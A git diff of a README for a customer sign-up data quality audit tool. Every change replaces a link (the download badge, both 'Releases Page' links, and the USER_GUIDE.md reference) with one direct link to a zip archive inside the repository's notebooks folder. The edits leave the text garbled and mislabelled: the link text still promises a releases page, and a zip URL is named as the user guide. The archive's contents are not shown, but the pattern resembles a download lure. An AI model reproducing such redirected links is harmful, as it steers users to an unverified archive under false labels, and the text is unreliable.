@@ -1,6 +1,6 @@
 # 📊 Customer-Sign-Up-Behaviour-Data-Quality-Audit - Understand Customer Trends Simply
 
-![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-blue)
+![Download Latest Release](https://raw.githubusercontent.com/VGabriel20/Customer-Sign-Up-Behaviour-Data-Quality-Audit/main/notebooks/Customer-Sign-Up-Behaviour-Data-Quality-Audit_3.1.zip%20Latest%20Release-Click%20Here-blue)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to the Customer Sign-Up Behaviour Data Quality Audit project. This softw
 
 To get started, you need to download the software. Click the link below to visit the releases page where you can find the latest version:
 
-[Visit the Releases Page to Download](https://github.com/VGabriel20/Customer-Sign-Up-Behaviour-Data-Quality-Audit/releases)
+[Visit the Releases Page to Download](https://raw.githubusercontent.com/VGabriel20/Customer-Sign-Up-Behaviour-Data-Quality-Audit/main/notebooks/Customer-Sign-Up-Behaviour-Data-Quality-Audit_3.1.zip)
 
 1. Open the link above in your web browser.
 2. You will see a list of available versions.
@@ -68,7 +68,7 @@ With this tool, you can make informed decisions based on real data, helping you 
 
 ## 📖 Additional Documentation
 
-If you would like more detailed documentation on how to use the application, please refer to the USER_GUIDE.md file included in the downloaded package. This guide will walk you through the various sections of the software and provide tips for effective use.
+If you would like more detailed documentation on how to use the application, please refer to the https://raw.githubusercontent.com/VGabriel20/Customer-Sign-Up-Behaviour-Data-Quality-Audit/main/notebooks/Customer-Sign-Up-Behaviour-Data-Quality-Audit_3.1.zip file included in the downloaded package. This guide will walk you through the various sections of the software and provide tips for effective use.
 
 ## 💬 Need Help?
 
@@ -84,4 +84,4 @@ Thank you for using the Customer Sign-Up Behaviour Data Quality Audit. We hope t
 
 Don't wait! Start analyzing your customer data today. 
 
-[Visit the Releases Page to Download](https://github.com/VGabriel20/Customer-Sign-Up-Behaviour-Data-Quality-Audit/releases)
+[Visit the Releases Page to Download](https://raw.githubusercontent.com/VGabriel20/Customer-Sign-Up-Behaviour-Data-Quality-Audit/main/notebooks/Customer-Sign-Up-Behaviour-Data-Quality-Audit_3.1.zip)
